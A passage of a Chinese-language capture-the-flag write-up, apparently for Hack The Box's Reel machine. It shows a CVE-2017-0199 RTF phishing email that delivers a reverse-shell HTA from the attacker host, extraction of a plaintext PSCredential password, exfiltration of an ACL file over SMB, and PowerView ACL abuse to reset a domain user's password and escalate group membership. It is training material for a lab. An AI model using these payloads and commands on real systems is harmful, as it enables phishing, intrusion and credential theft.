+<h4 id="生成恶意hta文件"><a href="#生成恶意hta文件" class="headerlink" title="生成恶意hta文件"></a>生成恶意hta文件</h4><p>首先使用 msfvenom 生成一个用于反弹shell的 hta 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=2222 -f hta-psh -o msfv.hta</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%8811.36.11.png" alt="截屏2021-11-08 下午11.36.11"></p>
+<h4 id="生成请求恶意hta的rtf文件"><a href="#生成请求恶意hta的rtf文件" class="headerlink" title="生成请求恶意hta的rtf文件"></a>生成请求恶意hta的rtf文件</h4><p>生成 rtf 文件可以使用 github 上的 CVE-2017-0199 漏洞利用工具来完成</p>
+<p><em><strong>工具地址：<a target="_blank" rel="noopener" href="https://github.com/bhdresh/CVE-2017-0199">https://github.com/bhdresh/CVE-2017-0199</a></strong></em></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%889.58.05.png" alt="截屏2021-11-08 下午9.58.05"><br>通过以下命令生成 rtf 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python cve-2017-0199_toolkit.py -M gen -w mac.rtf -u http://10.10.14.17/msfv.hta -t rtf -x 0</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-08%20%E4%B8%8B%E5%8D%8811.42.40.png" alt="截屏2021-11-08 下午11.42.40"></p>
+<h4 id="发送邮件获取权限"><a href="#发送邮件获取权限" class="headerlink" title="发送邮件获取权限"></a>发送邮件获取权限</h4><p>然后在本地监听2222端口并开启 http 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 2222</span><br><span class="line">python -m SimpleHTTPServer 80</span><br></pre></td></tr></table></figure>
+<p>使用 sendemail 发送带有漏洞利用的 rtf 文件邮件进行网络钓鱼</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendEmail -f mac@megabank.com -t nico@megabank.com -u <span class="string">&quot;Invoice Attached&quot;</span> -m <span class="string">&quot;You are overdue payment&quot;</span> -a mac.rtf -s 10.10.10.77 -v </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%8812.25.25.png" alt="截屏2021-11-09 上午12.25.25"><br>用户点开后成功在本地收到反弹shell<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%8812.27.49.png" alt="截屏2021-11-09 上午12.27.49"><br>在当前用户桌面上寻找第一个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\nico\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\nico\Desktop\user.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%8812.38.45.png" alt="截屏2021-11-09 上午12.38.45"><br>成功拿到第一个flag</p>
+<h3 id="msf自动化利用"><a href="#msf自动化利用" class="headerlink" title="msf自动化利用"></a>msf自动化利用</h3><p>当然也可以使用 MSF 进行漏洞利用，首先生成恶意 hta 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole </span><br><span class="line">msf &gt; use exploit/windows/fileformat/office_word_hta</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.14.17</span><br><span class="line">msf &gt; <span class="built_in">set</span> lport 4444</span><br><span class="line">msf &gt; <span class="built_in">set</span> srvhost 10.10.14.17</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.31.03.png" alt="截屏2021-11-09 上午1.31.03"><br>之后向目标用户发送钓鱼邮件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendEmail -f mac@megabank.com -t nico@megabank.com -u <span class="string">&quot;Invoice Attached&quot;</span> -m <span class="string">&quot;You are overdue payment&quot;</span> -a /root/.msf4/<span class="built_in">local</span>/msf.doc -s 10.10.10.77 -v </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.19.05.png" alt="截屏2021-11-09 上午1.19.05"><br>成功收到 meterpreter<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.32.26.png" alt="截屏2021-11-09 上午1.32.26"></p>
+<h2 id="0x03-上线-tom"><a href="#0x03-上线-tom" class="headerlink" title="0x03 上线[tom]"></a>0x03 上线[tom]</h2><h3 id="凭据恢复"><a href="#凭据恢复" class="headerlink" title="凭据恢复"></a>凭据恢复</h3><p>在当前用户桌面的上还发现一个文件<code>cred.xml</code>，在其中包含一些关于<code>Tom</code>的认证信息</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">type</span> <span class="string">c:\Users\nico\Desktop\cred.xml</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.33.34.png" alt="截屏2021-11-09 上午1.33.34"><br>在 powershell 中存在一个叫做 PSCredengial 的对象，它提供了一种存储用户名、密码和凭据的方法，还有两个用于操作 xml 文档的函数<code>Import-CliXml</code>和<code>Export-CliXml</code>。那么我们可以使用 powershell 从 xml 文件中提取明文密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span> = Import-CliXml -Path c:\Users\nico\Desktop\cred.xml;<span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.41.06.png" alt="截屏2021-11-09 上午1.41.06"><br>成功拿到账号密码：<code>Tom/1ts-mag1c!!!</code></p>
+<h3 id="ssh登陆tom"><a href="#ssh登陆tom" class="headerlink" title="ssh登陆tom"></a>ssh登陆tom</h3><p>使用该用户来登录目标的 ssh 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@10.10.10.77</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.46.04.png" alt="截屏2021-11-09 上午1.46.04"><br>成功上线用户 tom 并进入 tom 的桌面进行查看，在<code>AD Audit\BloodHound\Ingestors</code>中发现<code>acls.csv</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors&quot;</span></span><br><span class="line">dir</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.48.42.png" alt="截屏2021-11-09 上午1.48.42"></p>
+<h3 id="csv信息收集"><a href="#csv信息收集" class="headerlink" title="csv信息收集"></a>csv信息收集</h3><p>为了将该文件下载下来，我们可以通过 smbserver.py 构建 smb 服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 smbserver.py mac ~/hackthebox/Machines/Reel </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.54.04.png" alt="截屏2021-11-09 上午1.54.04"><br>将该文件通过 smb 服务传递到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy acls.csv \\10.10.14.17\mac</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.56.45.png" alt="截屏2021-11-09 上午1.56.45"><br>在本地打开该 csv 文件<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%881.59.20.png" alt="截屏2021-11-09 上午1.59.20"><br>在其中发现 tom 对 claire 拥有<code>WriteOwner</code>权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.01.14.png" alt="截屏2021-11-09 上午2.01.14"><br>而 claire 对 Backup_Admins 组对象拥有<code>WriteDacl</code>权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.02.53.png" alt="截屏2021-11-09 上午2.02.53"><br>那么也就是说我们一旦拥有 claire 用户就可以对 Backup_Admins 组对象进行操作</p>
+<h3 id="BloodHound表格分析"><a href="#BloodHound表格分析" class="headerlink" title="BloodHound表格分析"></a>BloodHound表格分析</h3><p>BloodHound 可以对电子表格进行分析并将其可视化输出，由于文件中其中拥有多个关系目录，通过 BloodHound 在大型环境中快速找到两个对象之间的路径。可以通过以下命令进行安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install bloodhound</span><br></pre></td></tr></table></figure>
+<p>安装完后开启 neo4j 数据库，如果出现以下报错<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.13.11.png" alt="截屏2021-11-09 上午9.13.11"><br>创建<code>log</code>目录和对应日志<code>neo4j.log</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /usr/share/neo4j/logs</span><br><span class="line">touch /usr/share/neo4j/logs/neo4j.log</span><br></pre></td></tr></table></figure>
+<p>再次开启 neo4j 数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">neo4j start</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.18.15.png" alt="截屏2021-11-09 上午9.18.15"><br>使用默认账号密码登录 bloodhound</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">username:</span> <span class="string">neo4j</span></span><br><span class="line"><span class="attr">password:</span> <span class="string">neo4j</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.21.24.png" alt="截屏2021-11-09 上午9.21.24"><br>首次登录需要重新设置密码，将密码修改为<code>mac.</code>再次登录<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%889.57.28.png" alt="截屏2021-11-09 上午9.57.28"><br>但是上传数据一直没成功，因此无法使用 bloodhound 来寻找对应关系</p>
+<h2 id="0x04-上线-claire"><a href="#0x04-上线-claire" class="headerlink" title="0x04 上线[claire]"></a>0x04 上线[claire]</h2><h3 id="修改claire用户密码"><a href="#修改claire用户密码" class="headerlink" title="修改claire用户密码"></a>修改claire用户密码</h3><p>通过 PowerView 以及tom的写入权限可以切换至 claire 用户会话，首先导入 PowerView.ps1 脚本</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell //切换到powershell命令行</span><br><span class="line">. .\PowerView.ps1 //将PowerView导入</span><br></pre></td></tr></table></figure>
+<p>将 tom 设置为 claire 的 ACL 的所有者并授予修改该 ACL 密码的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObjectOwner -identity claire -OwnerIdentity tom</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword</span><br></pre></td></tr></table></figure>
+<p>创建凭据并设置 claire 的密码为<code>MagicMac123!@#</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cred</span> = ConvertTo-SecureString <span class="string">&quot;MagicMac123!@#&quot;</span> -AsPlainText -force</span><br><span class="line">Set-DomainUserPassword -identity claire -accountpassword <span class="variable">$cred</span></span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.48.36.png" alt="截屏2021-11-09 上午2.48.36"></p>
+<h3 id="ssh登陆claire"><a href="#ssh登陆claire" class="headerlink" title="ssh登陆claire"></a>ssh登陆claire</h3><p>使用重新设置的密码登录用户 claire</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh claire@10.10.10.17</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.54.38.png" alt="截屏2021-11-09 上午2.54.38"></p>
+<p>由于 claire 对 backup_admins 组具有 WriteDacl 权限，那么我们也可以将其添加到该组中。<br>首先查看该组成员，目前该组中现在只有 ranj 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group backup_admins</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.57.13.png" alt="截屏2021-11-09 上午2.57.13"></p>
+<p>尝试在该组中添加 claire 用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net group backup_admins claire /add</span><br><span class="line">net group backup_admins</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%882.58.41.png" alt="截屏2021-11-09 上午2.58.41"><br>用户 claire 成功添加到 backup_admins 用户组下后重新登录，否则无法生效</p>
+<h2 id="0x05-上线-administrator"><a href="#0x05-上线-administrator" class="headerlink" title="0x05 上线[administrator]"></a>0x05 上线[administrator]</h2><h3 id="查看管理员桌面权限"><a href="#查看管理员桌面权限" class="headerlink" title="查看管理员桌面权限"></a>查看管理员桌面权限</h3><p>重新登陆后查看当前用户对目录<code>c:\users\administrator</code>的权限</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icalcs Administrator</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.37.11.png" alt="截屏2021-11-09 上午3.37.11"><br>发现 Backup_Admins 用户组可访问，于是查看管理员用户桌面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> c:\Users\Administrator\Desktop</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.37.32.png" alt="截屏2021-11-09 上午3.37.32"><br>查看 root.txt 发现无法进入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/960d5b61/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8A%E5%8D%883.37.57.png" alt="截屏2021-11-09 上午3.37.57"></p>
+<h3 id="查找登陆密码"><a href="#查找登陆密码" class="headerlink" title="查找登陆密码"></a>查找登陆密码</h3><p>进入备份目录<code>Backup Scripts</code>中查看是否包含密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;Back Scripts&quot;</span></span><br><span class="line"><span class="built_in">type</span> * | findstr pass</span><br></pre></td></tr></table></figure>
